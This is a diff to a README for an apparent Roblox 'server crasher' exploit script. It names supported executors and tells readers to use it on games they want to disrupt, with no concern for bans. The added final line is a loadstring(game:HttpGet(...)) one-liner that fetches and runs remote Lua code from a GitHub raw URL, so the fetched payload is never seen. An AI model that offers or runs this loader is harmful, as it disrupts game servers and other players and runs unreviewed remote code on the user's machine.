@@ -17,6 +17,14 @@ This script doesn't work in some games, but should work in most that don't have 
 * Trigon
 * Fluxus (not tested)
 
-🤓 Use this on bad games that you want to fuck
+#
+
+Use this on bad games that you want to fuck
 
 I don't care if you get banned or something
+
+If it doesn't work in your game, it's not my problem.
+
+#
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trxsh-root/roblox-server-crasher/main/loader.lua"),true))()
